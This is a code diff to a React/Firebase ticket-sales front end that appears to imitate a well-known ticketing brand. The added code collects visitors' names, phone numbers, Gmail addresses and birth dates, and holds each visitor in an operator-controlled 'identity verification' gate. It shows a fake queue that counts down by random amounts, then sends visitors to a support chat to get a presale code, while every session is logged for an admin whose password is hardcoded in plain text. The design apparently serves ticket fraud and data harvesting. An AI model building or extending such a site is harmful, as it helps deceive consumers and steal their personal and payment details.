@@ -1,5 +1,5 @@
-import React, { useState, useEffect } from 'react';
-import { Search, CheckCircle, MessageSquare, Send, X, Bell, ShieldCheck, Star, ChevronLeft, User, Lock, Menu, CreditCard, Ticket, Globe } from 'lucide-react';
+import React, { useState, useEffect, useRef } from 'react';
+import { Search, CheckCircle, MessageSquare, Send, X, Bell, ShieldCheck, Star, ChevronLeft, User, Lock, Menu, CreditCard, Ticket, Globe, Clock, AlertTriangle } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
 import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot } from 'firebase/firestore';
@@ -7,7 +7,7 @@ import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSna
 import SeatMap from './components/SeatMap.jsx';
 import Checkout from './components/Checkout.jsx';
 
-// --- FIREBASE SETUP ---
+// --- FIREBASE CONFIG ---
 const firebaseConfig = {
   apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
   authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
@@ -29,25 +29,30 @@ const ADMIN_PASS = "Ifeoluwapo@1!";
 const INITIAL_EVENTS = [
   { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
   { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
-  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
 ];
 
 export default function App() {
   const [user, setUser] = useState(null);
-  const [currentPage, setCurrentPage] = useState('home'); 
+  const [currentPage, setCurrentPage] = useState('home'); // home, auth, waiting_room, queue, presale, seatmap, checkout, success, admin
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
-  const [sessions, setSessions] = useState([]); 
   const [currentSessionId, setCurrentSessionId] = useState(null);
-  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
-  
-  // Mobile Polish & Search
+  const [globalSettings, setGlobalSettings] = useState({ price: 250, presaleCode: 'FAN2024' });
+  const [sessionData, setSessionData] = useState({});
+
+  // UI State
   const [searchTerm, setSearchTerm] = useState('');
   const [showMobileSearch, setShowMobileSearch] = useState(false);
+  const [language, setLanguage] = useState('EN'); // EN, ES, DE, FR
+  const [showLangMenu, setShowLangMenu] = useState(false);
 
-  // Auth State
-  const [tempUser, setTempUser] = useState({ email: '', name: '' });
+  // Auth/Gate State
+  const [tempUser, setTempUser] = useState({ email: '', name: '', phone: '', dob: '', agreed: false });
+  const [presaleInput, setPresaleInput] = useState('');
   
+  // Queue State
+  const [queuePosition, setQueuePosition] = useState(2431);
+
   // Admin & Chat
   const [isChatOpen, setIsChatOpen] = useState(false);
   const [chatMessages, setChatMessages] = useState([]);
@@ -72,7 +77,7 @@ export default function App() {
     }
   }, []);
 
-  // --- SESSION TRACKING (Optimized) ---
+  // --- SESSION & DB SYNC ---
   useEffect(() => {
     if (!user) return;
     const startTracking = async () => {
@@ -94,7 +99,8 @@ export default function App() {
         status: 'browsing',
         email: 'Visitor',
         chatHistory: [{ sender: 'system', text: 'Welcome! How can we help?', timestamp: new Date().toISOString() }],
-        notifications: []
+        notifications: [],
+        accessGranted: false // New field for Admin Gate
       });
       setCurrentSessionId(docRef.id);
       sessionStorage.setItem('tm_sid', docRef.id);
@@ -102,19 +108,52 @@ export default function App() {
     startTracking();
   }, [user]);
 
-  // --- SYNC DATA ---
+  // --- LISTEN TO SESSION CHANGES (For Admin Gate) ---
   useEffect(() => {
     if (!currentSessionId) return;
     return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
       if(snap.exists()) {
         const d = snap.data();
+        setSessionData(d);
         setChatMessages(d.chatHistory || []);
         if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
+        
+        // AUTO-MOVE: If Admin Approved access, move to Queue
+        if (d.accessGranted === true && currentPage === 'waiting_room') {
+            setCurrentPage('queue');
+        }
       }
     });
-  }, [currentSessionId]);
+  }, [currentSessionId, currentPage]);
 
-  // --- ACTIONS ---
+  // --- SYNC GLOBAL SETTINGS (Presale Code) ---
+  useEffect(() => {
+    if (!user) return;
+    return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), (snap) => {
+        if(snap.exists()) setGlobalSettings(snap.data());
+    });
+  }, [user]);
+
+  // --- QUEUE LOGIC ---
+  useEffect(() => {
+      if (currentPage === 'queue') {
+          const interval = setInterval(() => {
+              setQueuePosition(prev => {
+                  const drop = Math.floor(Math.random() * 50) + 10;
+                  const newPos = prev - drop;
+                  if (newPos <= 0) {
+                      clearInterval(interval);
+                      setCurrentPage('presale');
+                      return 0;
+                  }
+                  return newPos;
+              });
+          }, 2000);
+          return () => clearInterval(interval);
+      }
+  }, [currentPage]);
+
+  // --- HELPERS ---
   const updateSession = (updates) => {
     if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates);
   };
@@ -129,11 +168,12 @@ export default function App() {
   };
 
   const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
+  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸', 'DE': '🇩🇪', 'FR': '🇫🇷' };
 
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {/* --- HEADER (MOBILE OPTIMIZED) --- */}
+      {/* --- HEADER --- */}
       <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
         <div className="flex items-center gap-3 z-20">
            {currentPage !== 'home' && (
@@ -147,43 +187,27 @@ export default function App() {
            </div>
         </div>
 
-        {/* Mobile Search Toggle */}
-        <div className="flex items-center gap-2 lg:gap-4 z-20">
-           {currentPage === 'home' && (
-             <>
-               <button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white">
-                  <Search className="w-5 h-5" />
-               </button>
-               {/* Desktop Search */}
-               <div className="hidden lg:flex relative group">
-                  <input 
-                    className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-64 focus:w-80 transition-all outline-none focus:bg-white focus:text-black"
-                    placeholder="Search events..." 
-                    value={searchTerm}
-                    onChange={e => setSearchTerm(e.target.value)}
-                  />
-                  <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
-               </div>
-             </>
-           )}
+        <div className="flex items-center gap-4 z-20">
+           {/* Language Selector */}
+           <div className="relative">
+              <button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all">
+                  <span>{flags[language]}</span>
+                  <span>{language}</span>
+              </button>
+              {showLangMenu && (
+                  <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">
+                      {Object.keys(flags).map(l => (
+                          <button key={l} onClick={() => {setLanguage(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>
+                      ))}
+                  </div>
+              )}
+           </div>
+           
            <button onClick={() => setCurrentPage('admin')}><User className="w-5 h-5 text-gray-400 hover:text-white transition-colors" /></button>
         </div>
-
-        {/* Mobile Search Bar Dropdown */}
-        {showMobileSearch && currentPage === 'home' && (
-           <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10">
-              <input 
-                autoFocus
-                className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none"
-                placeholder="Search..." 
-                value={searchTerm}
-                onChange={e => setSearchTerm(e.target.value)}
-              />
-           </div>
-        )}
       </header>
 
-      {/* --- NOTIFICATION TOAST --- */}
+      {/* --- NOTIFICATION --- */}
       {activeNotification && (
         <div className="fixed top-20 left-4 right-4 z-[100] bg-[#ea0042] text-white p-4 rounded-2xl shadow-[0_10px_40px_rgba(0,0,0,0.5)] flex items-start gap-4 animate-bounce">
           <Bell className="w-5 h-5 shrink-0" />
@@ -197,7 +221,6 @@ export default function App() {
         
         {currentPage === 'home' && (
           <div className="space-y-10 animate-fadeIn">
-            {/* Hero */}
             <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
               <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" />
               <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
@@ -207,7 +230,6 @@ export default function App() {
               </div>
             </div>
 
-            {/* Events List */}
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
               {filteredEvents.map(ev => (
                 <div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl">
@@ -228,50 +250,107 @@ export default function App() {
           </div>
         )}
 
-        {/* --- SIMPLIFIED LOGIN FLOW (Direct Entry) --- */}
+        {/* --- 1. SIGN UP FORM --- */}
         {currentPage === 'auth' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
-              <div className="bg-white text-gray-900 w-full max-w-md p-8 lg:p-12 rounded-[40px] shadow-2xl animate-slideUp space-y-8">
-                 <div className="text-center space-y-2">
-                    <h2 className="text-3xl font-black italic uppercase tracking-tighter">Fan Sign In</h2>
-                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">Join the queue for {selectedEvent?.artist}</p>
+              <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
+                 <div className="text-center">
+                    <h2 className="text-3xl font-black italic uppercase tracking-tighter">Create Account</h2>
+                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">Verify Identity to Enter</p>
                  </div>
                  
-                 <div className="space-y-4">
-                    <div className="space-y-2">
-                       <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Email Address</label>
-                       <input 
-                         className="w-full bg-gray-100 border-2 border-transparent focus:border-[#026cdf] focus:bg-white rounded-2xl p-4 font-bold outline-none transition-all text-lg" 
-                         placeholder="name@example.com"
-                         value={tempUser.email}
-                         onChange={e => setTempUser({...tempUser, email: e.target.value})}
-                       />
-                    </div>
-                    <div className="space-y-2">
-                       <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Full Name</label>
-                       <input 
-                         className="w-full bg-gray-100 border-2 border-transparent focus:border-[#026cdf] focus:bg-white rounded-2xl p-4 font-bold outline-none transition-all text-lg" 
-                         placeholder="Ticket Holder Name"
-                         value={tempUser.name}
-                         onChange={e => setTempUser({...tempUser, name: e.target.value})}
-                       />
-                    </div>
+                 <div className="space-y-3">
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Full Name" value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} />
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Mobile Number" value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} />
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Gmail Address" value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
+                     <input type="date" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none text-gray-500" value={tempUser.dob} onChange={e => setTempUser({...tempUser, dob: e.target.value})} />
+                     
+                     <div className="flex items-center gap-3 pt-2">
+                        <input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} />
+                        <p className="text-[10px] font-bold text-gray-500">I agree to the Terms & Anti-Bot Policy</p>
+                     </div>
                  </div>
 
                  <button 
                    onClick={() => {
-                     if(!tempUser.email || !tempUser.name) return alert("Please fill all details");
-                     updateSession({ status: 'viewing_map', email: tempUser.email, name: tempUser.name });
-                     setCurrentPage('seatmap');
+                     if(!tempUser.email || !tempUser.name || !tempUser.agreed) return alert("Please fill all details & agree to terms.");
+                     updateSession({ email: tempUser.email, name: tempUser.name, phone: tempUser.phone, status: 'waiting_approval' });
+                     setCurrentPage('waiting_room');
                    }}
                    className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
                  >
-                   Join Queue
+                   Verify & Join
                  </button>
               </div>
            </div>
         )}
 
+        {/* --- 2. ADMIN GATE (WAITING ROOM) --- */}
+        {currentPage === 'waiting_room' && (
+           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn">
+               <div className="w-20 h-20 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" />
+               <div className="space-y-2">
+                   <h2 className="text-3xl font-black italic uppercase tracking-tighter">Verifying Identity...</h2>
+                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">Please hold while the Host reviews your request.</p>
+               </div>
+               <div className="bg-[#1f262d] p-6 rounded-2xl border border-white/10 max-w-sm">
+                   <p className="text-xs font-bold text-gray-500">Session ID: <span className="text-white font-mono">{currentSessionId?.slice(0,8)}...</span></p>
+                   <p className="text-xs font-bold text-gray-500 mt-2">Do not refresh this page.</p>
+               </div>
+           </div>
+        )}
+
+        {/* --- 3. THE QUEUE --- */}
+        {currentPage === 'queue' && (
+           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-10 animate-fadeIn">
+               <div className="space-y-4">
+                  <div className="w-4 h-4 bg-green-500 rounded-full mx-auto animate-ping" />
+                  <h2 className="text-5xl lg:text-8xl font-black italic text-white tracking-tighter">{queuePosition}</h2>
+                  <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">Fans Ahead of You</p>
+               </div>
+               <div className="w-full max-w-md bg-white/5 h-2 rounded-full overflow-hidden">
+                  <div className="h-full bg-[#026cdf] transition-all duration-1000" style={{ width: `${Math.max(5, 100 - (queuePosition/2431)*100)}%` }} />
+               </div>
+               <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
+                   <Clock className="w-3 h-3" /> Estimated Wait: Less than a minute
+               </div>
+           </div>
+        )}
+
+        {/* --- 4. PRESALE WALL --- */}
+        {currentPage === 'presale' && (
+           <div className="min-h-[70vh] flex items-center justify-center p-4">
+               <div className="bg-white text-gray-900 w-full max-w-md p-10 rounded-[40px] shadow-2xl animate-slideUp text-center space-y-8 border-t-8 border-[#ea0042]">
+                   <ShieldCheck className="w-16 h-16 text-[#ea0042] mx-auto" />
+                   <div>
+                       <h2 className="text-3xl font-black italic uppercase tracking-tighter">Early Access</h2>
+                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mt-2">Enter your Code to unlock seats</p>
+                   </div>
+                   <input 
+                      className="w-full text-center text-3xl font-black uppercase tracking-[0.5em] border-b-4 border-gray-200 focus:border-[#ea0042] outline-none py-4"
+                      placeholder="CODE"
+                      value={presaleInput}
+                      onChange={e => setPresaleInput(e.target.value.toUpperCase())}
+                   />
+                   <p className="text-[10px] font-bold text-gray-400">Don't have a code? <span className="text-[#026cdf] cursor-pointer" onClick={()=>setIsChatOpen(true)}>Chat with Support</span></p>
+                   <button 
+                      onClick={() => {
+                          if (presaleInput === globalSettings.presaleCode) {
+                              setCurrentPage('seatmap');
+                              updateSession({ status: 'viewing_map' });
+                          } else {
+                              alert("Invalid Presale Code");
+                          }
+                      }}
+                      className="w-full bg-[#1f262d] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:bg-black transition-all"
+                   >
+                       Unlock
+                   </button>
+               </div>
+           </div>
+        )}
+
+        {/* --- 5. SEAT MAP (The Struggle) --- */}
         {currentPage === 'seatmap' && (
            <SeatMap 
              event={selectedEvent} 
@@ -298,7 +377,7 @@ export default function App() {
           </div>
         )}
 
-        {/* --- ADMIN LOGIN (Simple) --- */}
+        {/* --- ADMIN LOGIN --- */}
         {currentPage === 'admin' && !isAdminLoggedIn && (
            <div className="min-h-[60vh] flex items-center justify-center p-4">
               <div className="bg-white w-full max-w-sm p-8 rounded-[30px] shadow-2xl space-y-6">
@@ -313,7 +392,7 @@ export default function App() {
         {currentPage === 'admin' && isAdminLoggedIn && (
            <div className="text-center py-20">
               <h2 className="text-3xl font-black">Admin Panel Loading...</h2>
-              <p className="text-gray-500">We will rebuild this in Chunk 2!</p>
+              <p className="text-gray-500">Feature locked until Chunk 2 update.</p>
               <button onClick={() => setIsAdminLoggedIn(false)} className="mt-4 text-red-500 font-bold underline">Logout</button>
            </div>
         )}
